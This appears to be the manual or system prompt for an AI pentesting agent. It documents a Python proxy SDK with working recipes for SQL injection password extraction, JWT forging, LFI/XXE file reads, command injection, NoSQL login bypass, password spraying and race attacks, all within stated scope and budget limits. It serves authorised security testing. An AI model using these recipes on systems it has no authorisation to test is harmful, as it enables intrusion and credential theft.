# proxy_brain — the operator's manual

You are inside `proxy_brain`: you write Python, and `redamon` is pre-imported.
`redamon` is your ONLY I/O — the corpus of captured HTTP traffic and the live
replay path both flow through it. There is no menu of fixed tools; there is a
language. If an interactive web proxy can do it, you can code it here — you compose the
primitives below into any capability you need.

Read this first, then read one deep section right before you write the code for
that technique: `print(redamon.manual("jwt"))`, `redamon.manual("sqli")`, etc.
(sections listed at the bottom). Keep reads scoped — output is truncated.

### THE SDK (exact signatures — this is the whole surface)

READ (no traffic, tenant-scoped for you, returns text or objects):
- `redamon.search(filters=None, **kwargs) -> [Txn]` — HTTP history. Pass a dict
  `search({"host":"x","hasAuth":True,"method":"POST"})` or kwargs
  `search(host="x", has_auth=True)`. Filters: host, method, status,
  statusClass/status_class ("2xx".."5xx"), tool, source ("recon"/"agent"),
  session/sessionId, run/runId, hasAuth, reflected, only5xx, q (URL substring),
  bodyq/body_q (response-body substring), limit. Each `Txn` has `.id` `.raw` `.method` `.status` `.url` `.host` `.path`.
- `redamon.get(id, part="response") -> str` — full headers+body of ONE txn.
  part = "request" | "response" | "both".
- `redamon.sitemap() -> str` — distinct host+path+method observed, with counts.
- `redamon.params() -> str` — distinct request params + a type guess (seq-id/uuid/jwt/base64).
- `redamon.grep(pattern, limit=50) -> str` — substring search over response bodies + snippet.
- `redamon.diff(id_a, id_b) -> str` — structural diff of two responses (status/len/headers/body).
- `redamon.to_curl(id) -> str` — render a captured request as a runnable curl (PoC).
- `redamon.query(spec) -> str` — constrained analytics over the traffic table (dict spec:
  {select:[{col|agg,col?,as?}], where:[{col,op,val}], group_by:[col], order_by:[{col|as,dir}], limit}).
  Columns: method, scheme, host, port, path, status_code, resp_body_size,
  resp_content_type, response_time_ms, is_tls, is_replay, had_auth, has_set_cookie,
  reflected_params, blocked, in_scope, tool, source, run_id, session_id, phase, started_at.
  Aggs: count, sum, avg, min, max. (bodies + tenant columns are NOT queryable.)

DECODE / CRYPTO (pure, no traffic):
- `redamon.decode(value) -> str` — peel base64/url/hex/gzip layers to readable text.
- `redamon.jwt(token) -> Jwt` — `.header`, `.payload` (dicts), and
  `.forge(alg_none=True | secret="s" | claims={...}) -> str` (HS256 / alg:none).

ACTIVE (LIVE TRAFFIC — see LIMITS below):
- `redamon.replay(id, mutate=None) -> Response` — resend a captured request with
  fields changed. mutate keys: method, path, query, param:{k:v}, headers:{k:v},
  dropHeaders:[..], cookie, body. **host/scheme/port are PINNED to the origin and
  CANNOT be changed** — a replay can only ever hit the origin host.
- `redamon.batch(id, mutations, parallel=False) -> [Response]` — replay once per
  mutation. `parallel=True` fires them CONCURRENTLY (real race window).
- `redamon.fuzz(id, insertion_point, payloads) -> [Response]` — iterate payloads
  over ONE query-param name; one Response per payload (server caps the count).
  (For header/body/path/cookie fuzzing, loop `replay` yourself.)
- `redamon.browser(id) -> Browser` — a real chromium PINNED to the host of txn
  `id`, for signals that only exist AFTER JavaScript runs (DOM XSS, SPA routes,
  JS-minted CSRF). Drive it: `.goto(path)` `.click(sel)` `.fill(sel,val)`
  `.submit(sel)` `.eval(js)` (budgeted actions); read `.dom()` `.text(sel)`
  `.alerts()` `.console()` `.url()` (free — the oracle). Always `.close()`.
  Read `manual("browser")` first. Do NOT drive it from a parallel `batch`.

RESULT:
- `redamon.finding(kind, txn_id, evidence=None, severity="medium")` — record a finding.
- `redamon.emit(text)` / `print(...)` — what returns to you. Print DISTILLED lines only.

`Response` fields: `.status` (int|None), `.headers` (lowercased dict), `.body` (str),
`.length` (int), `.payload` (the fuzz payload, if any). `Txn` fields: `.id` `.raw` `.method` `.status` `.url` `.host` `.path`.

### WEB-PROXY WORKFLOWS → HOW YOU BUILD THEM (the mental model)

You reproduce a web proxy's whole workflow by composing the SDK in code:

| Workflow | Build it with |
|---|---|
| HTTP history / site map | `redamon.search(...)`, `redamon.sitemap()`, `redamon.query(...)` |
| Resend a request with tweaks | `redamon.replay(id, {...})` |
| Payload fuzzing sweep | `redamon.fuzz` or loops over `redamon.replay`; see `manual("intruder")` |
| Compare two responses | `redamon.diff(a, b)` (and compare `.length`/`.body`/`.status` in code) |
| Token entropy analysis | collect a token N times, compute entropy in Python; see `manual("sequencer")` |
| Decode / forge tokens | `redamon.decode(v)`, `redamon.jwt(tok).forge(...)` |
| Access-control diffing | replay every request under a 2nd identity, `diff` vs baseline; `manual("authz")` |
| Concurrent race testing | `redamon.batch(id, [...]*N, parallel=True)`; `manual("race")` |
| Hidden parameter mining | brute param/header names, diff vs baseline; `manual("cache")` |
| Request smuggling | find candidates; confirm raw via kali_shell (proxy normalises framing); `manual("smuggling")` |
| Grep and extract from responses | read `.body`/`.status`/`.length` per Response; that IS your oracle |
| Post-JS / DOM / client-side signal | `redamon.browser(id)` then `.dom()`/`.alerts()`/`.console()`; `manual("browser")` |

The boundary is your own code — it's Python. Anything a web proxy automates, you script.

### THE ORACLE PATTERN (the core skill)

Almost every confirmation is: send a variant, then read a specific fact out of the
Response (`.status`, `.length`, a regex over `.body`, response time) and compare it
to a baseline. That fact is your oracle. Examples:
- reflected value appears unescaped in `.body`  -> XSS
- `.body` contains a SQL error / a different row-count  -> SQLi
- weaker identity gets the SAME `.body` as the owner  -> IDOR/BOLA
- a boolean condition flips `.length` between two payloads  -> blind SQLi
- one payload makes `.status`/timing diverge from the pack  -> anomaly worth a look

### LIMITS & SAFETY (these are enforced — design around them)

- **Host is pinned.** `replay`/`batch`/`fuzz` can ONLY hit the origin transaction's
  host. You cannot retarget. (So to attack endpoint X, first `search` for a captured
  request to X and use its id.)
- **Active sends are exploitation-phase only** and are refused otherwise (reads/decode
  work in any phase).
- **Per-session send budget** (default 1000 live requests). Keep batches tight; a
  bisection or a race of hundreds is fine, a blind 100k sweep is not.
- **`browser` is separately gated**: same host-pin + exploitation-only, plus its own
  per-session ACTION budget (default 100). Opening a browser AND every goto/click/
  eval each cost one unit; free reads (`.dom()`/`.alerts()`/…) don't. A `.goto` to a
  different host/port/scheme is refused, and a redirect off the pinned origin aborts
  the run. At most 3 browsers may be open at once — `.close()` each when done.
- **180s wall-clock** per proxy_brain run. Long campaigns = several runs.
- **Output is truncated.** Aggregate in code; print a few distilled lines, never raw bodies.
- **Everything you send is re-captured** (isReplay lineage) and egress-guarded.

### NOT AVAILABLE (do not try these)

- **No OAST / Collaborator** (no out-of-band callback server). Bugs that can ONLY be
  confirmed via an external DNS/HTTP callback (blind SSRF with no echo, blind stored
  XSS firing elsewhere, DNS-exfil SQLi) cannot be *confirmed* here — fall back to
  in-band signals: reflection, response diff, timing, error strings. You can still
  FIND and report the injection point; note "needs OAST to confirm".
- No raw sockets to arbitrary hosts (host-pin). No WebSocket capture (HTTP only).

### SECTION INDEX  (read one right before you use it)

`redamon.manual("<name>")`:
- **recon** — map the surface, find leads, pick the right txn id.
- **intruder** — fuzzing: attack types, payload processing, grep-extract oracles.
- **sqli** — boolean / time-based blind extraction (binary search).
- **authz** — IDOR / BOLA sweeps, identity swap, verb & lifecycle testing.
- **jwt** — alg:none, HS/RS confusion, weak-secret brute, kid/jku.
- **race** — concurrent batch: limit-overrun, double-spend, coupon reuse.
- **smuggling** — CL.TE / TE.CL timing probes, H2 desync.
- **cache** — web cache poisoning via unkeyed headers; hidden-param/header mining.
- **injection** — XSS / SSTI / SSRF / open-redirect / CRLF confirmation in-band.
- **decode** — encodings, opaque tokens, secrets in JS/bodies.
- **sequencer** — token randomness/entropy analysis.
- **flows** — multi-step chains: carry CSRF tokens / session state across steps.
- **nosql** — MongoDB operator injection ($ne/$regex): auth bypass + blind extraction.
- **graphql** — introspection, field-suggestion leak, alias amplification/brute.
- **lfi** — local file inclusion / path traversal + php://filter source disclosure.
- **cmdi** — OS command injection (in-band marker + time-based blind).
- **cors** — CORS misconfig: origin reflection + null-origin trust.
- **xxe** — XML external entity in-band file read.
- **auth** — credential attacks: password spray/stuffing, session fixation.
- **browser** — drive a real chromium; read the rendered DOM/console/alerts as the
  oracle (DOM XSS, SPA-only routes, JS-minted CSRF then hand off to `replay`).
- **report** — turn a confirmed finding into evidence (finding + to_curl).

## recon — map the surface and pick your target

```python
print(redamon.sitemap())                       # what endpoints exist (host+path+method)
print(redamon.params())                         # params + injectability guess (seq-id/uuid/jwt/base64)
for t in redamon.search(only5xx=True):          # servers already erroring = soft spots
    print(t.raw)
print(redamon.grep("error|exception|stack", 30))# leaked internals
print(redamon.grep("eyJ"))                       # JWTs in bodies/JS
# analytics: top hosts by 5xx
print(redamon.query({"select":[{"col":"host"},{"agg":"count","as":"n"}],
                     "where":[{"col":"status_code","op":">=","val":500}],
                     "group_by":["host"],"order_by":[{"as":"n","dir":"desc"}],"limit":20}))
```
Everything downstream needs a `Txn.id` from here. `redamon.get(id,"both")` shows the
exact request shape (headers/params/body) you will mutate.

## intruder — fuzzing done right (the oracle is everything)

Attack types, in code:
- **Sniper** (one position, many payloads): `redamon.fuzz(id, "param", payloads)`.
- **Battering ram** (same payload in many positions): loop `replay` setting each
  position to the SAME value: `redamon.replay(id, {"param":{"a":p,"b":p}})`.
- **Pitchfork** (lists in lockstep): `for u,pw in zip(users,pws): replay(id, {"param":{"user":u,"pass":pw}})`.
- **Cluster bomb** (all combinations): nested loops over two lists.

Insertion points beyond query params — loop `replay` with the right mutate key:
```python
# header injection point
for p in payloads: r = redamon.replay(id, {"headers": {"X-Forwarded-For": p}})
# body/JSON field
for p in payloads: r = redamon.replay(id, {"body": '{"q":"%s"}' % p})
# path segment
for p in payloads: r = redamon.replay(id, {"path": "/api/item/%s" % p})
```
Payload processing = just transform in Python before sending (base64/url/hash/case):
```python
import base64, urllib.parse, hashlib
pl = base64.b64encode(seed.encode()).decode()
```
Grep-extract oracle — pull the deciding fact from each response and tabulate:
```python
import re
for r in redamon.fuzz(id, "id", ["1","2","0","-1","1 OR 1=1","1'"]):
    m = re.search(r'"total":(\d+)', r.body)
    print(f"{r.payload:10} {r.status} {r.length}b rows={m.group(1) if m else '-'} "
          f"{'SQLERR' if 'SQL' in r.body else ''}")
```
Read the table: the row whose status/length/extracted value breaks the pattern is
your hit. Confirm it with a second targeted `replay`.

## sqli — blind extraction by binary search

Boolean-blind: find a condition that changes the response (length/status/marker),
then bisect each character's ASCII in ~7 requests (log2 128).
```python
import re
t = redamon.search(path="/api/check")[0]
def truthy(cond):
    r = redamon.replay(t.id, {"param": {"id": f"1 AND ({cond})"}})
    return r.length > 500          # <-- calibrate: the TRUE vs FALSE signal for THIS app
out = ""
for pos in range(1, 41):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if truthy(f"ascii(substr((SELECT password FROM users LIMIT 1),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    if lo == 32: break
    out += chr(lo); print(out)
redamon.finding("sqli", t.id, severity="high")
```
Time-based (no boolean signal): swap the oracle for response time. Use a SLEEP payload
(`... AND SLEEP(5)` / `pg_sleep(5)` / `WAITFOR DELAY '0:0:5'`) and read the delay from a
diff between a fast baseline `replay` and the payload `replay` (compare wall-clock in
Python around each call). Keep the delay small (2-3s) and the char count bounded — the
send budget is real.

## authz — IDOR / BOLA and access-control (Autorize, in code)

The test: take requests that WORKED for one identity, re-issue them (a) as a WEAKER
identity and (b) UNAUTHENTICATED, and compare to the baseline. Same data back = broken.
There is no `identity()` helper — supply the alternate auth yourself in `mutate`
(get a low-priv session cookie from a captured login response, or from the user).
```python
for t in redamon.search(session="sess_owner"):
    base = redamon.replay(t.id, {})                        # owner baseline (a Response — same shape as below)
    if base.status not in (200, 201):
        continue                                           # only test requests that actually returned data
    unauth = redamon.replay(t.id, {"dropHeaders": ["Cookie", "Authorization"]})
    low    = redamon.replay(t.id, {"cookie": "session=<low_priv_cookie>"})
    for who, r in (("unauth", unauth), ("lowpriv", low)):
        if r.status == base.status and r.body == base.body:  # weaker identity got the SAME data
            redamon.finding("bola", t.id, evidence=r, severity="high")
            print("LEAK", who, t.id)
```
Compare Response-to-Response (`.status`/`.body`), never a Response body to `get()`'s
FORMATTED text. Confirm a positive: the leaked body carries the OTHER user's unique
data (name/email), not just a matching length. Cover all verbs and lifecycle states.
Cover the whole matrix (research-backed): test **all verbs** (GET/POST/PUT/PATCH/DELETE),
not just GET — action-level BOLA is the biggest family; test objects in **all lifecycle
states** (active/archived/deleted); horizontal (peer user's id) AND vertical (drop to
unauth / lower role). Increment/guess ids with `mutate.param` or `mutate.path`. Verify a
positive by checking the leaked body carries the OTHER user's unique data (name/email),
not just a matching length.

## jwt — token forging (JWT Editor, in code)

```python
t = redamon.search(hasAuth=True)[0]
tok = redamon.get(t.id, "request")                       # lift the Bearer/cookie token
import re; m = re.search(r'(eyJ[\w-]+\.[\w-]+\.[\w-]*)', tok); j = redamon.jwt(m.group(1))
print(j.header, j.payload)
# 1) alg:none — server honours unsigned tokens
none_tok = j.forge(alg_none=True, claims={"role": "admin"})
# 2) weak secret — brute a wordlist, then mint anything
forged = j.forge(secret="secret123", claims={"role": "admin", "sub": 1})
# 3) RS256 -> HS256 confusion: sign an HS256 token using the server's RSA PUBLIC key as
#    the HMAC secret (fetch the pubkey from /jwks or a cert; use it as `secret`).
# 4) kid injection: set the header key on the object first, then sign with an empty secret:
#    j.header["kid"] = "../../dev/null" ; ktok = j.forge(secret="", claims={"role":"admin"})
for label, ft in [("none", none_tok), ("weak", forged)]:
    r = redamon.replay(t.id, {"headers": {"Authorization": f"Bearer {ft}"}})
    print(label, r.status, "ACCEPTED" if r.status == 200 else "rejected")
    if r.status == 200: redamon.finding("jwt-"+label, t.id, evidence=r, severity="critical")
```

## race — concurrency (limit-overrun, double-spend)

`batch(..., parallel=True)` prepares every request, then releases the curls together so
they collide in one server-side window. Classic targets: redeem a single-use coupon
twice, overdraw a balance, cast N votes, bypass a per-account limit.
```python
t = redamon.search(path="/redeem")[0]
resps = redamon.batch(t.id, [{}] * 20, parallel=True)     # 20 identical, concurrent
ok = sum(1 for r in resps if r.status == 200 and "success" in r.body.lower())
print("successes:", ok, "(>1 on a single-use action = race)")
if ok > 1: redamon.finding("race-limit-overrun", t.id, severity="high")
```
Keep N modest (20-50) — enough for the window, within budget. If the action needs a
fresh token per attempt, fetch tokens first (see `manual("flows")`), then race the final step.

## smuggling — request-smuggling / desync (find candidates, confirm elsewhere)

IMPORTANT: `redamon.replay` CANNOT detect smuggling. A desync needs raw, ambiguous
Content-Length vs Transfer-Encoding framing, and BOTH curl and the capture proxy
NORMALISE the request before it reaches the target's front-end — the ambiguity is
resolved away, so a timing probe through the replay path proves nothing. What you can
do here is FIND candidates and hand off confirmation to a raw tool:
```python
# 1) Candidates live at hop boundaries — endpoints fronted by a proxy/cache/LB.
for t in redamon.search(method="POST"):
    resp = redamon.get(t.id, "response").lower()
    if any(k in resp for k in ("via", "x-cache", "cf-ray", "x-served-by", "x-forwarded")):
        print("smuggling candidate (fronted):", t.id, "->", redamon.to_curl(t.id).splitlines()[-1])
```
2) CONFIRM with a tool that preserves byte framing, run via `kali_shell` (NOT redamon):
   a raw-socket Python script or `smuggler`, sending CL.TE / TE.CL probes directly. A
   vulnerable back-end HANGS ~10s waiting for bytes the front-end already ended.
   HTTP/2 front-ends that downgrade to HTTP/1.1 re-expose these.

## cache — web cache poisoning & hidden inputs (Param Miner, in code)

Unkeyed inputs (headers the cache ignores but the origin reflects) poison a shared
response. Find them by diffing a reflected marker.
```python
t = redamon.search(path="/")[0]
base = redamon.replay(t.id, {})
mark = "rdmn9z1"
for h in ["X-Forwarded-Host","X-Forwarded-Scheme","X-Host","X-Original-URL",
          "X-Rewrite-URL","X-Forwarded-For","X-Forwarded-Server"]:
    r = redamon.replay(t.id, {"headers": {h: f"{mark}.evil"}})
    if mark in r.body and mark not in base.body:
        print("REFLECTED unkeyed header:", h)                 # cache-poisoning lead
        redamon.finding("cache-poisoning", t.id, evidence=r, severity="high")
```
Hidden-parameter mining: batch many candidate names into one request and diff vs
baseline; when the response changes, binary-search the batch to isolate the live one
(mass-assignment: `role`,`is_admin`,`debug`; cache: unkeyed headers).

## injection — XSS / SSTI / SSRF / open-redirect / CRLF (in-band confirmation)

Confirm from the response you get back (no OAST here):
```python
t = redamon.search(reflected=True)[0]
# XSS: unique marker must appear UNESCAPED
r = redamon.replay(t.id, {"param": {"q": "rdmn<svg/onload=1>"}})
if "rdmn<svg/onload=1>" in r.body:
    redamon.finding("xss", t.id, evidence=r, severity="high")
# SSTI: math that only a template engine evaluates
r = redamon.replay(t.id, {"param": {"q": "rdmn{{7*7}}"}})
if "rdmn49" in r.body: redamon.finding("ssti", t.id, evidence=r, severity="critical")
# open redirect: Location echoes attacker host (same-origin URL only, host is pinned;
# check the Location VALUE, not the connection)
r = redamon.replay(t.id, {"param": {"next": "//evil.example"}})
if "evil.example" in (r.headers.get("location") or ""): redamon.finding("open-redirect", t.id, severity="medium")
# SSRF (in-band): if the endpoint ECHOES fetched content, a same-origin internal URL
# that returns internal data confirms it; blind SSRF needs OAST (unavailable) — report the sink.
```

## decode — encodings, opaque tokens, secrets

```python
print(redamon.decode("dXNlcjoxMDAyOnJvbGU9dXNlcg=="))   # -> user:1002:role=user
print(redamon.grep("api[_-]?key|secret|AKIA|-----BEGIN", 30))  # secrets in bodies/JS
# opaque param? params() flags base64/jwt; decode then attack the plaintext structure.
```

## sequencer — token randomness

Collect the same token many times and measure entropy; low/patterned = predictable
session or reset token.
```python
import math, collections
toks = []
for _ in range(40):
    r = redamon.replay(login_txn_id, {})
    sc = r.headers.get("set-cookie", "")
    m = __import__("re").search(r'session=([^;]+)', sc)
    if m: toks.append(m.group(1))
# crude per-position Shannon entropy
if toks:
    L = min(len(x) for x in toks)
    ent = []
    for i in range(L):
        c = collections.Counter(x[i] for x in toks)
        ent.append(-sum((n/len(toks))*math.log2(n/len(toks)) for n in c.values()))
    print("avg bits/char:", round(sum(ent)/len(ent),2), "(low = predictable)")
```

## flows — multi-step chains (carry CSRF / session state)

Some actions need a fresh token from a prior response. Extract it, inject it into the next replay.
```python
import re
step1 = redamon.get("clx-form-txn")                     # the page that mints the token
csrf = re.search(r'name="csrf"\s+value="([^"]+)"', step1).group(1)
r = redamon.replay("clx-submit-txn", {"body": f"new_password=Hacked1!&csrf={csrf}"})
print(r.status)                                          # single-shot replay would 403 (stale token)
```
Cookies set by an earlier replay aren't auto-carried — read `Set-Cookie` from the
first Response and pass it as `mutate.cookie` on the next. Chain: login -> get token ->
act, then race or tamper the final step.

## report — evidence for a confirmed finding

```python
redamon.finding("idor", txn_id, evidence=resp, severity="high")  # structured, goes to your output
print(redamon.to_curl(txn_id))                                   # reproducible PoC for the write-up
```
A finding needs: the vuln class, the exact request (curl), the deciding evidence
(status/length/extracted value or the leaked data), and severity. Print those, not raw bodies.

## nosql — NoSQL (MongoDB) operator injection

JSON APIs that build Mongo queries from the body are bypassable with operator objects
like `{"$ne":null}` (always true). Send via `mutate.body` (JSON) or `mutate.param`
(querystring apps use `username[$ne]=x`).
```python
import re
t = redamon.search(path="/api/login", method="POST")[0]
base = redamon.replay(t.id, {})                                   # normal (likely 401)
# auth bypass: match ANY non-null user + pass
r = redamon.replay(t.id, {"headers": {"Content-Type": "application/json"},
                          "body": '{"username":{"$ne":null},"password":{"$ne":null}}'})
if r.status in (200, 302) and r.status != base.status:
    redamon.finding("nosql-auth-bypass", t.id, evidence=r, severity="critical")
# blind extraction: {"password":{"$regex":"^a.*"}} — a status/length flip confirms the
# prefix; loop the charset to pull the value out char by char (same idea as sqli bisection).
```

## graphql — GraphQL (introspection, field suggestion, aliases)

Usually POST /graphql with a JSON `{"query":"..."}` body.
```python
import re
g = redamon.search(path="/graphql", method="POST") or redamon.search(bodyq="query")
t = g[0]
ct = {"Content-Type": "application/json"}
# 1) introspection — dump the whole schema (the attack-surface map)
r = redamon.replay(t.id, {"headers": ct, "body": '{"query":"query{__schema{types{name fields{name}}}}"}'})
if "__schema" in r.body:
    redamon.finding("graphql-introspection", t.id, evidence=r, severity="medium")
# 2) field suggestion — works even with introspection OFF: a wrong field leaks valid names
r = redamon.replay(t.id, {"headers": ct, "body": '{"query":"query{userr{id}}"}'})
print(re.findall(r'Did you mean[^"]+', r.body))
# 3) alias amplification / brute — N aliases of one resolver in ONE request (one HTTP hit,
#    dodges request-count limits): mutation{a0:login(...){token} a1:login(...){token} ...}
import json
aliases = " ".join(f'a{i}:login(user:"admin",pass:"p{i}"){{token}}' for i in range(50))
r = redamon.replay(t.id, {"headers": ct, "body": json.dumps({"query": "mutation{%s}" % aliases})})
```

## lfi — local file inclusion / path traversal (in-band)

A file/path/template param that returns file contents. Confirm by reading a known file;
`php://filter` pulls PHP source (base64) without executing it.
```python
import re
t = redamon.search()[0]                                          # a request with a file-ish param
for pl in ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
           "/etc/passwd", "....//....//etc/passwd"]:
    r = redamon.replay(t.id, {"param": {"file": pl}})
    if "root:x:0:0" in r.body:
        redamon.finding("lfi", t.id, evidence=r, severity="high"); print("LFI:", pl); break
# PHP source disclosure -> decode the base64 blob, it starts with <?php
r = redamon.replay(t.id, {"param": {"file": "php://filter/convert.base64-encode/resource=index.php"}})
m = re.search(r'[A-Za-z0-9+/]{40,}={0,2}', r.body)
if m and redamon.decode(m.group(0)).lstrip().startswith("<?php"):
    redamon.finding("lfi-source-disclosure", t.id, evidence=r, severity="high")
```

## cmdi — OS command injection (in-band + time-based)

Inject a separator + command into a param the app hands to a shell.
```python
import time
t = redamon.search()[0]
mark = "rdmn7k"
for sep in [f";echo {mark}", f"|echo {mark}", f"&&echo {mark}", f"$(echo {mark})", f"`echo {mark}`"]:
    r = redamon.replay(t.id, {"param": {"host": "127.0.0.1" + sep}})
    if mark in r.body:
        redamon.finding("cmdi", t.id, evidence=r, severity="critical"); print("CMDI:", sep); break
# blind: a sleep that delays the response confirms execution (OAST/DNS exfil unavailable)
s = time.time(); redamon.replay(t.id, {"param": {"host": "127.0.0.1;sleep 5"}}); dt = time.time() - s
if dt > 4.5: redamon.finding("cmdi-blind", t.id, severity="critical")
```

## cors — CORS misconfiguration (origin reflection)

Send an attacker `Origin` and read the CORS response headers (lowercased).
```python
t = redamon.search(hasAuth=True)[0]
r = redamon.replay(t.id, {"headers": {"Origin": "https://evil.example"}})
acao = r.headers.get("access-control-allow-origin", "")
acac = r.headers.get("access-control-allow-credentials", "")
if acao == "https://evil.example" and acac.lower() == "true":
    redamon.finding("cors-origin-reflection", t.id, evidence=r, severity="high")   # creds-readable cross-origin
r = redamon.replay(t.id, {"headers": {"Origin": "null"}})                          # sandboxed-iframe/data: trick
if r.headers.get("access-control-allow-origin") == "null":
    redamon.finding("cors-null-origin", t.id, evidence=r, severity="medium")
```

## xxe — XML external entity (in-band file read)

For endpoints that parse XML/SOAP bodies. In-band works when the parsed entity is
reflected in the response; blind XXE needs OAST (unavailable) — report the sink instead.
```python
t = redamon.search(method="POST")[0]                            # an XML endpoint (Content-Type xml)
xxe = ('<?xml version="1.0"?>'
       '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
       '<r>&x;</r>')                                            # wrap in whatever field the app echoes
r = redamon.replay(t.id, {"headers": {"Content-Type": "application/xml"}, "body": xxe})
if "root:x:0:0" in r.body:
    redamon.finding("xxe-file-read", t.id, evidence=r, severity="critical")
# Do NOT fire billion-laughs / DoS payloads at a live target.
```

## auth — credential attacks (spray, stuffing, fixation)

```python
t = redamon.search(path="/login", method="POST")[0]
fail = redamon.replay(t.id, {}).status                          # baseline failed-login status
# password spray: ONE password across many users (dodges per-account lockout)
for u in ["admin", "root", "test", "user1"]:
    r = redamon.replay(t.id, {"param": {"username": u, "password": "Winter2026!"}})  # mutate.body for JSON
    if r.status in (200, 302) and r.status != fail:
        redamon.finding("weak-credentials", t.id, evidence=r, severity="high"); print("HIT", u)
# session fixation: does the session id CHANGE after login? if not -> fixation
pre  = redamon.replay(t.id, {}).headers.get("set-cookie", "")
post = redamon.replay(t.id, {"param": {"username": "valid", "password": "valid"}}).headers.get("set-cookie", "")
if pre and post and pre.split(";")[0] == post.split(";")[0]:
    redamon.finding("session-fixation", t.id, severity="medium")
# credential stuffing = spray breached user:pass pairs (pitchfork over two lists).
```

## browser — the rendered-DOM oracle (DOM XSS, SPA, JS flows)

Use this ONLY when the signal lives in the page AFTER JavaScript runs — a value
curl never sees because curl never executes JS. If the payload already reflects in
the raw response body, use `replay`/`fuzz` (cheaper, no browser). `browser(id)`
opens a real chromium PINNED to txn `id`'s host; find that id with `search` first.

Budgeted actions (each costs one of ~100 per session, and so does opening the
browser): `.goto(path)` `.click(sel)` `.fill(sel,val)` `.submit(sel)`
`.press(sel,key)` `.eval(js)`. Free reads (the oracle, no budget): `.dom()`
`.text(sel)` `.html(sel)` `.console()` `.alerts()` `.url()`. Always `.close()`
(at most 3 browsers open at once). Never drive it from `batch(parallel=True)`
(sync Playwright is not thread-safe).

```python
# DOM-based XSS: the sink runs in JS, so alert() firing is the confirmation.
t = redamon.search(host="target.tld")[0]        # any captured txn on the host
b = redamon.browser(t.id)
b.goto("/profile#name=<img src=x onerror=alert(1)>")   # payload in the hash, read by JS
if b.alerts():                                          # a dialog fired -> executed
    redamon.finding("dom-xss", t.id, evidence=str(b.alerts()), severity="high")
b.close()
```

```python
# SPA route only reachable through the app's own JS navigation.
b = redamon.browser(t.id)
b.goto("/app"); b.click("a[href='#/admin']")
print(b.text("main")[:800])                     # rendered admin view, if authz is broken
b.close()
```

```python
# JS-minted CSRF token -> hand the value to replay for the real exploit request.
b = redamon.browser(t.id)
b.goto("/settings")
token = b.eval("document.querySelector('input[name=csrf]').value")
b.close()
r = redamon.replay(t.id, {"param": {"csrf": token, "email": "attacker@evil.tld"}})
```

Notes: a `.goto` off the pinned host is refused server-side; a click that navigates
off-host aborts the run. Sub-resources the page loads are egress-guarded, not
host-pinned. Everything the browser fetches is re-captured as
`tool=proxy_brain_browser`, so you can `search(tool="proxy_brain_browser")` to see
exactly what it generated and then `replay` any of it.
